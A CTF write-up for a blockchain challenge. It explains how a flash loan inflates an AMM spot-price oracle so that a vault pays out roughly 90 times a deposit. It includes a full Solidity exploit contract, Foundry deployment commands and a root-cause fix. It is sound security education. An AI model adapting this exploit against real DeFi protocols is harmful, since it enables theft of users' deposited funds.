# Caldrin's Day Away: Blockchain / Smart Contract

**CTF:** Cyber Apocalypse CTF 2026: The Salt Crown  
**Category:** Blockchain  
**Flag:** `HTB{inquir3y_0ne_c4ldr1n_s0lv3d_b6c49a8fc220ed107411efbb725ce5ae}`

---

## Challenge Overview

We're given a Solidity 0.8.20 DeFi system with four on-chain contracts:

| Contract | Role |
|---|---|
| `DocksideMarket` | Constant-product AMM (no fee) trading CROWN ↔ SALT |
| `GoldhandCredit` | Flash loan provider holding 90,000,000 CROWN |
| `DocksideSharehouse` | Vault where users deposit CROWN for "claim marks" |
| `PublicStampDesk` | On-chain oracle gate: validates stamped read orders |

`Setup.isSolved()` returns `true` once the sharehouse CROWN balance drops below **150,000 CROWN** (from an initial 1,000,000 CROWN).

The player starts with nothing. One call to `Setup.takeTravelPurse()` mints **10,000 CROWN** and credits **10,000 `travelPurseCredit`**: both needed to interact with the sharehouse.

---

## Vulnerability: Flash-Loan AMM Oracle Manipulation

### The oracle

`DocksideSharehouse.recountHoldings()` accepts a pre-approved "stamped order" and calls `PublicStampDesk.readStampedOrder()`, which does a `staticcall` to `DocksideMarket.valueCargoAsOneGood(1_000_000e6, 0)`. This returns the **spot price**:

```
recordedHoldings = crownReserve * 1_000_000e6 / totalCargoMarks
                 = crownReserve          (since totalCargoMarks == 1_000_000e6)
```

So `recordedHoldings` is set directly to whatever `crownReserve` is at the moment `recountHoldings()` is called. This is a classic spot-price oracle: manipulable within a single transaction.

### The accounting asymmetry

`DocksideSharehouse` has two key functions:

```solidity
// leaveGoods: deposit CROWN, receive claimMarks proportional to recordedHoldings
claimMarkAmount = (crownCoinAmount * totalClaimMarks) / recordedHoldings;

// redeemClaim: burn claimMarks, receive CROWN proportional to recordedHoldings
crownCoinAmount = (claimMarkAmount * recordedHoldings) / totalClaimMarks;
```

Profit is possible if `recordedHoldings` is **low at deposit time** and **high at redemption time**.

### The missed guard

`leaveGoods()` blocks flash loan reentrancy:

```solidity
require(goldhandCredit.activeBorrower() == address(0), "LOAN_ACTIVE");
```

But **`redeemClaim()` has no such check**. This means we can:

1. Call `leaveGoods()` *before* a flash loan to acquire claim marks at the normal rate.
2. During the flash loan, inflate `crownReserve` by dumping the borrowed CROWN into the AMM.
3. Call `recountHoldings()`: now `recordedHoldings` = inflated `crownReserve`.
4. Call `redeemClaim()`: the payout is computed against the inflated value, extracting ~90× what we deposited.
5. Sell SALT back, repay the loan.

---

## Attack Walkthrough

### Before the flash loan

```
Setup.takeTravelPurse()
    → attacker receives 10,000 CROWN
    → travelPurseCredit[attacker] = 10,000

crownCoin.approve(sharehouse, max)
sharehouse.leaveGoods(10_000e6)
    → claimMarkAmount = 10_000e6 * 990_000e18 / 1_000_000e6 = 9,900e18
    → totalClaimMarks: 990,000e18 → 999,900e18
    → recordedHoldings: 1,000,000e6 → 1,010,000e6
    → sharehouse CROWN: 1,000,000e6 → 1,010,000e6
```

### Inside the flash loan (onQuayLoan with 90,000,000 CROWN borrowed)

**Step 1: Buy SALT to inflate crownReserve:**
```
market.trade(CROWN→SALT, 90_000_000e6)
    crownReserve:  1,000,000e6  →  91,000,000e6
    saltReserve:   1,000,000e6  →     10,989e6
    SALT received: ~989,011e6
```

**Step 2: Update the oracle:**
```
sharehouse.recountHoldings(stampedOrder)
    valueCargoAsOneGood(1_000_000e6, 0) = 91,000,000e6
    recordedHoldings = 91,000,000e6   (was 1,010,000e6)
```

**Step 3: Redeem at inflated rate:**
```
sharehouse.redeemClaim(9_900e18)
    crownCoinAmount = 9_900e18 * 91_000_000e6 / 999_900e18
                    ≈ 900,990e6 CROWN
    sharehouse CROWN: 1,010,000e6 → 109,010e6   ✓ < 150,000e6 threshold
```

**Step 4: Sell SALT, repay loan:**
```
market.trade(SALT→CROWN, ~989,011e6 SALT)
    crownOut ≈ 90,000,000e6
crownCoin.transfer(goldhandCredit, 90_000_000e6)  // repay
```

Net: deposited 10,000 CROWN, withdrew 900,990 CROWN: a ~90× return funded by the sharehouse's collateral.

---

## Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Setup.sol";
import "./IQuayBorrower.sol";

contract Exploit is IQuayBorrower {
    Setup public immutable setup;

    constructor(address _setup) {
        setup = Setup(_setup);
    }

    function run() external {
        TradeToken crown = setup.crownCoin();
        TradeToken salt  = setup.saltGoods();
        DocksideMarket market   = setup.quayMarket();
        GoldhandCredit credit   = setup.goldhandCredit();
        DocksideSharehouse house = setup.sharehouse();

        // 1. Get travel purse (10k CROWN + travelPurseCredit)
        setup.takeTravelPurse();

        // 2. Deposit into sharehouse to acquire claim marks
        crown.approve(address(house), type(uint256).max);
        house.leaveGoods(10_000e6);

        // 3. Pre-approve market for the flash loan callback
        crown.approve(address(market), type(uint256).max);
        salt.approve(address(market),  type(uint256).max);

        // 4. Flash loan all available CROWN; pass stamped order as callback data
        bytes memory order = setup.buildPublicRecountOrder();
        uint256 loan = crown.balanceOf(address(credit));
        credit.borrowForOneCall(loan, order);
    }

    function onQuayLoan(uint256 amount, bytes calldata data) external override {
        TradeToken crown = setup.crownCoin();
        TradeToken salt  = setup.saltGoods();
        DocksideMarket market   = setup.quayMarket();
        DocksideSharehouse house = setup.sharehouse();
        GoldhandCredit credit   = setup.goldhandCredit();

        // a. Dump borrowed CROWN into AMM → crownReserve inflates 91×
        market.trade(0, 1, amount, 0);

        // b. Oracle recount → recordedHoldings = 91,000,000e6
        house.recountHoldings(data);

        // c. Redeem claim marks at inflated recordedHoldings → ~900,990 CROWN out
        house.redeemClaim(house.claimMarks(address(this)));

        // d. Sell SALT back → recover ~90,000,000 CROWN for repayment
        market.trade(1, 0, salt.balanceOf(address(this)), 0);

        // e. Repay flash loan
        crown.transfer(address(credit), amount);
    }
}
```

### Running it

```bash
# Clone challenge contracts into a Foundry project
forge init htb-caldrin && cp *.sol htb-caldrin/src/

# Write Exploit.sol and script/Solve.s.sol (see above), then:
export PRIVATE_KEY=0x<key_from_nc>
export SETUP_ADDRESS=0x<setup_from_nc>
export RPC_URL=http://<host>:<rpc_port>/api/<uuid>

forge script script/Solve.s.sol \
  --rpc-url $RPC_URL \
  --broadcast -vvvv

# Verify
cast call $SETUP_ADDRESS "isSolved()(bool)" --rpc-url $RPC_URL
# → true

# Get flag from HTB checker
echo "3" | nc <host> <info_port>
```

---

## Root Cause Summary

| Weakness | Detail |
|---|---|
| Spot-price oracle | `recountHoldings` reads AMM reserves directly: trivially manipulable in one tx |
| Incomplete flash-loan guard | `leaveGoods` blocks reentrancy; `redeemClaim` does not |
| No TWAP / commit-reveal | Any time-averaged or delay-based oracle would break this attack |

The fix is standard: use a TWAP oracle or require a time delay between `recountHoldings` and any redemption that relies on the updated value.

---

*Writeup by [e0 Security](https://e0sec.github.io)*
